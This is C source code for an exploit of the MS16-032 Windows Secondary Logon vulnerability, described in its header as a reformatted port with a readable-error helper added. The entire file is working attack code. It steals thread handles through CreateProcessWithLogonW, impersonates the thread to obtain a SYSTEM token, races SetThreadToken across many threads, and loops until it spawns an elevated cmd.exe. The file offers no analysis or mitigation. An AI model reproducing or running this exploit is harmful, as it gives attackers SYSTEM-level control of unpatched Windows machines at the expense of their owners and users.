//
// ms16-032
// just reformatted to C and added function to display readable error
//
#define UNICODE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <shlwapi.h>
#include <Windows.h>

#pragma comment (lib, "advapi32.lib")
#pragma comment (lib, "shlwapi.lib")

#define MAX_PROCESSES 1000

typedef struct _thread_info_t {
  HANDLE hThread;
  HANDLE hToken;
} thread_info;

void xstrerror (wchar_t *fmt, ...)
{
  wchar_t *error=NULL;
  va_list arglist;
  wchar_t buffer[2048];
  DWORD   dwError=GetLastError();
  
  va_start (arglist, fmt);
  wvnsprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
  va_end (arglist);
  
  if (FormatMessage (
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
      NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
      (LPWSTR)&error, 0, NULL))
  {
    wprintf (L"\n  [ %s : %s", buffer, error);
    LocalFree (error);
  } else {
    wprintf (L"\n  [ %s : %i", buffer, dwError);
  }
}

BOOL isElevated(HANDLE hProcess) {
  HANDLE          hToken;
	BOOL            bResult = FALSE;
  TOKEN_ELEVATION te;
  DWORD           dwSize;
  
  if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) 
  {
    if (GetTokenInformation(hToken, TokenElevation, &te, 
        sizeof(TOKEN_ELEVATION), &dwSize)) {
		  bResult = te.TokenIsElevated != 0;
    }
    CloseHandle(hToken);
	}
  return bResult;
}

HANDLE GetThreadHandle(void)
{
    PROCESS_INFORMATION pi;
    STARTUPINFO         si;
    HANDLE              hThread=NULL;
    BOOL                r;
    DWORD               err;
    
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    
    si.cb         = sizeof(si);
    si.hStdInput  = GetCurrentThread();
    si.hStdOutput = GetCurrentThread();
    si.hStdError  = GetCurrentThread();
    si.dwFlags    = STARTF_USESTDHANDLES;

    r=CreateProcessWithLogonW(L"test", L"test", L"test", 
                 LOGON_NETCREDENTIALS_ONLY, 
                 NULL, L"cmd.exe", CREATE_SUSPENDED, 
                 NULL, NULL, &si, &pi);
    if (r)
    {
      r=DuplicateHandle(pi.hProcess, (HANDLE)0x4, 
               GetCurrentProcess(), &hThread, 0, FALSE, 
               DUPLICATE_SAME_ACCESS);
      
      if (!r) {
        xstrerror(L"DuplicateHandle");
      }
      TerminateProcess(pi.hProcess, 1);
      CloseHandle(pi.hProcess);
      CloseHandle(pi.hThread);
    } else {
      xstrerror(L"CreateProcessWithLogonW");
    }
    return hThread;
}

typedef NTSTATUS __stdcall NtImpersonateThread(HANDLE ThreadHandle, 
      HANDLE ThreadToImpersonate, 
      PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService);

HANDLE GetSystemToken(HANDLE hThread)
{
  SECURITY_QUALITY_OF_SERVICE qs;
  HANDLE                      hToken;
  NTSTATUS                    status;
  NtImpersonateThread*        fNtImpersonateThread;
  
  SuspendThread(hThread);

  fNtImpersonateThread = (NtImpersonateThread*)GetProcAddress(GetModuleHandle(L"ntdll"), 
                                          "NtImpersonateThread");
  
  qs.Length             = sizeof(qs);
  qs.ImpersonationLevel = SecurityImpersonation;
  
  SetThreadToken(&hThread, NULL);
  
  status = fNtImpersonateThread(hThread, hThread, &qs);
  
  if (status != 0)
  {
    ResumeThread(hThread);
    printf("Error impersonating thread %08X\n", status);
    exit(1);
  }

  if (!OpenThreadToken(hThread, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, 
                       FALSE, &hToken))
  {
    printf("Error opening thread token: %d\n", GetLastError());
    ResumeThread(hThread);    
    exit(1);
  }

  ResumeThread(hThread);

  return hToken;
}

DWORD CALLBACK SetTokenThread(LPVOID lpArg)
{
  thread_info *p=(thread_info*)lpArg;
  
  for (;;) {
    if (!SetThreadToken(&p->hThread, p->hToken))
    {
      xstrerror(L"SetThreadToken");
      break;
    }
  }
  return 0;
}

int main(void)
{
  thread_info         ti[MAX_PROCESSES];
  int                 i, j, cnt;
  HANDLE              hThread, hToken, hProcessToken;
  DWORD               dwTid, dwSize;
  PROCESS_INFORMATION pi;
  STARTUPINFO         si;
  TOKEN_ELEVATION     te;
  
  puts ("ms16-32 exploit");
  
  printf("Gathering thread handles\n");

  // obtain thread handles
  for (cnt=0; cnt<MAX_PROCESSES; cnt++) 
  {
    hThread = GetThreadHandle();
    dwTid   = GetThreadId(hThread);
    
    if (!dwTid) {
      exit(1);
    }
    ti[cnt].hThread=hThread;
  }

  printf("Done, got %zd handles\n", cnt);
  
  for (i=0; i<cnt; i++)
  {
    hToken = GetSystemToken(ti[i].hThread);
    printf("System Token: %p\n", hToken);
    
    for (j=0; j<cnt; j++)
    {
      DuplicateToken(hToken, SecurityImpersonation, &ti[j].hToken);
      CreateThread(NULL, 0, SetTokenThread, (LPVOID)&ti[j], 0, NULL);
    }

    for (;;)
    {
      ZeroMemory(&pi, sizeof(pi));
      ZeroMemory(&si, sizeof(si));
      
      si.cb = sizeof(si);     

      if (CreateProcessWithLogonW(L"test", L"test", L"test", 
              LOGON_NETCREDENTIALS_ONLY, NULL, 
              L"cmd.exe", CREATE_SUSPENDED, NULL, NULL, 
              &si, &pi))
      {
        // If we can't get process token good chance it's a system process.
        if (!OpenProcessToken(pi.hProcess, MAXIMUM_ALLOWED, 
                              &hProcessToken))
        {
          printf("Couldn't open process token %d\n", GetLastError());
          ResumeThread(pi.hThread);
          break;
        }
        // Just to be sure let's check the process token isn't elevated.

        dwSize=0;
        if (!GetTokenInformation(hProcessToken, TokenElevation, 
                              &te, sizeof(te), &dwSize))
        {
          printf("Couldn't get token elevation: %d\n", GetLastError());
          ResumeThread(pi.hThread);
          break;
        }

        if (te.TokenIsElevated)
        {
          printf("Created elevated process\n");
          break;
        }

        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
      }     
    }
  }

  return 0;
}
